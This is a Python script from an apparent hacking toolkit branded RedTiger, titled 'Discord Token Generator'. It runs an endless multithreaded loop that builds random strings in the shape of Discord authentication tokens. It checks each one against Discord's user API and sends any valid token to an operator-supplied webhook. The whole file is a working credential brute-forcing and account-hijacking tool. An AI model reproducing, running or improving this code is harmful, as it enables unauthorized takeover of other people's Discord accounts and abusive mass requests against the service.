# Copyright (c) RedTiger (https://redtiger.shop)
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Util import *
from Config.Config import *
try:
    import string
    import requests
    import json
    import random
    import threading
except Exception as e:
   ErrorModule(e)
   
Title("Discord Token Generator")

try:
    webhook = input(f"{color.RED}\n{INPUT} Webhook ? (y/n) -> {color.RESET}")
    if webhook in ['y', 'Y', 'Yes', 'yes', 'YES']:
        webhook_url = input(f"{color.RED}{INPUT} Webhook URL -> {color.RESET}")
        CheckWebhook(webhook_url)

    try:
        threads_number = int(input(f"{INPUT} Threads Number -> {color.RESET}"))
    except:
        ErrorNumber()

    def send_webhook(embed_content):
        payload = {
        'embeds': [embed_content],
        'username': username_webhook,
        'avatar_url': avatar_webhook
        }

        headers = {
        'Content-Type': 'application/json'
        }

        requests.post(webhook_url, data=json.dumps(payload), headers=headers)

    def token_check():
        first = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([24, 26])))
        second = ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([6])))
        third =  ''.join(random.choice(string.ascii_letters + string.digits + '-' + '_') for _ in range(random.choice([38])))
        token = f"{first}.{second}.{third}"

        try:
            try:
                user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
                user['username']
                if webhook in ['y']:
                    embed_content = {
                    'title': f'Token Valid !',
                    'description': f"**__Token:__**\n```{token}```",
                    'color': color_webhook,
                    'footer': {
                    "text": username_webhook,
                    "icon_url": avatar_webhook,
                    }
                    }
                    send_webhook(embed_content)
                    print(f"{green}[{white}{current_time_hour()}{green}] {GEN_VALID} Status:  {color.WHITE}Valid{color.GREEN}  | Token: {color.WHITE}{token}{color.GREEN}")
                else:
                    print(f"{green}[{white}{current_time_hour()}{green}] {GEN_VALID} Status:  {color.WHITE}Valid{color.GREEN}  | Token: {color.WHITE}{token}{color.GREEN}")
            except:
                print(f"{red}[{white}{current_time_hour()}{red}] {GEN_INVALID} Status: {color.WHITE}Invalid{color.RED} | Token: {color.WHITE}{token}{color.RED}")
        except:
            print(f"{red}[{white}{current_time_hour()}{red}] {GEN_INVALID} Status: {color.WHITE}Error{color.RED} | Token: {color.WHITE}{token}{color.RED}")

    def request():
        threads = []
        try:
            for _ in range(int(threads_number)):
                t = threading.Thread(target=token_check)
                t.start()
                threads.append(t)
        except:
            ErrorNumber()

        for thread in threads:
            thread.join()

    while True:
        request()
except Exception as e:
    Error(e)